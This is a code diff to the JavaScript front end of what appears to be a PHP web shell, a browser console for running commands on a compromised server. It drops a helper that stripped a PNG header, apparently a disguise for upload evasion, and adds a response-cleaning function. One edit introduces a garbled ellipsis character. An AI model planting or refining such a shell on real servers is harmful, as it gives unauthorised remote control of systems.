@@ -460,7 +460,7 @@ if (isset($_GET["feature"])) {
                 var shortCwd = cwd;
                 if (cwd.split("/").length > 3) {
                     var splittedCwd = cwd.split("/");
-                    shortCwd = "…/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
+                    shortCwd = "â¦/" + splittedCwd[splittedCwd.length-2] + "/" + splittedCwd[splittedCwd.length-1];
                 }
                 return SHELL_CONFIG["username"] + "@" + SHELL_CONFIG["hostname"] + ":<span title=\"" + cwd + "\">" + shortCwd + "</span>#";
             }
@@ -533,12 +533,12 @@ if (isset($_GET["feature"])) {
             }
 
             function makeRequest(url, params, callback) {
-                function removePngHeader(str) {
-                  const header = "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a";
-                  if (str.startsWith(header)) {
-                    return str.slice(header.length);
-                  }
-                  return str;
+                function removeTrash(text) {
+									// If text does not start with {, delete everything up to {
+									if (text[0] !== '{') {
+										text = text.substring(text.indexOf('{'));
+									}
+									return text;
                 }
                 function getQueryString() {
                     var a = [];
@@ -549,13 +549,14 @@ if (isset($_GET["feature"])) {
                     }
                     return a.join("&");
                 }
-                var xhr = new XMLHttpRequest(xhr.responseText);
+                var xhr = new XMLHttpRequest();
                 xhr.open("POST", url, true);
                 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                 xhr.onreadystatechange = function() {
                     if (xhr.readyState === 4 && xhr.status === 200) {
                         try {
-                            const res = removePngHeader()
+                            const res = removeTrash(xhr.responseText)
+														console.log(res)
                             var responseJson = JSON.parse(res);
                             callback(responseJson);
                         } catch (error) {
